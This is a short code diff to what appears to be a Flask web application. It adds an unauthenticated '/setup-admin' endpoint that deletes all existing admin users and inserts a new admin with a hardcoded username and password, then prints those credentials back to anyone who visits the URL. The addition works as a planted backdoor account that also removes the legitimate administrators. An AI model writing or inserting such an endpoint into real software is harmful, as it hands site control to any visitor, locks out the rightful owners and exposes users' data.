@@ -274,3 +274,13 @@ init_db()
 
 if __name__=='__main__':
     init_db(); app.run(debug=True)
+
+@app.route('/setup-admin')
+def setup_admin():
+    conn = get_db()
+    conn.execute("DELETE FROM users WHERE role='admin'")
+    conn.execute("INSERT INTO users (username,password,role) VALUES (?,?,?)",
+                 ('youssef', hash_pw('9577you'), 'admin'))
+    conn.commit()
+    conn.close()
+    return 'Done! Login with youssef / 9577you'
